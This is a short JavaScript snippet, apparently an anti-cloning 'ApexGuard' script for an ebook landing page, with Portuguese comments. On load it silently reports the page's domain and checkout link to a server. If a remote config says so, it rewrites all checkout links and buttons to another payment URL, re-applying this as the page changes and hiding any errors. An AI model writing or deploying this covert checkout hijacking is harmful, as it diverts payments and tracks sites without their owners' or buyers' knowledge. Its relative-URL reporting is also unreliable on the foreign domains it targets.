(function() {
    // Configurações de Identificação do Ebook (pode ser expandido)
    const currentDomain = window.location.hostname;
    const currentPath = window.location.pathname;
    
    // 1. Tenta identificar o link de checkout atual do clonador
    function getOriginalCheckout() {
        // Busca links comuns da Lastlink ou outros padrões
        const links = Array.from(document.querySelectorAll('a[href*="lastlink"], a[href*="checkout"], a[href*="pay"]'));
        return links.length > 0 ? links[0].href : 'Nenhum link detectado';
    }

    const originalLink = getOriginalCheckout();

    // 2. Reporta o clone ao painel administrativo (Silenciosamente)
    fetch('/api/report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            domain: currentDomain,
            path: currentPath,
            timestamp: new Date().toISOString(),
            original_link: originalLink
        })
    }).catch(() => {
        // Fallback: Se /api/report falhar (ex: domínio externo), tenta a URL absoluta se disponível
    });

    // 3. Verifica se deve executar o SEQUESTRO de checkout
    async function initGuard() {
        try {
            const response = await fetch(`/api/config?domain=${currentDomain}`);
            const config = await response.json();
            
            if (config.should_hijack) {
                console.log("ApexGuard: Sistema de Proteção Ativo.");
                
                // Sobrescreve todos os links de checkout existentes na página
                const hijackLink = config.checkout_url;
                
                function performHijack() {
                    const buttons = document.querySelectorAll('a[href*="lastlink"], a[href*="checkout"], a[href*="pay"], .btn-primary, .btn-nav');
                    buttons.forEach(btn => {
                        if (btn.tagName === 'A') {
                            btn.href = hijackLink;
                        } else {
                            // Se for botão, altera o comportamento do clique
                            btn.onclick = (e) => {
                                e.preventDefault();
                                window.location.href = hijackLink;
                            };
                        }
                    });
                }

                // Executa agora e monitora mudanças na página (para clones que usam React/Vue)
                performHijack();
                const observer = new MutationObserver(performHijack);
                observer.observe(document.body, { childList: true, subtree: true });
            }
        } catch (e) {
            // Silêncio em caso de erro
        }
    }

    // Aguarda o DOM estar pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initGuard);
    } else {
        initGuard();
    }
})();
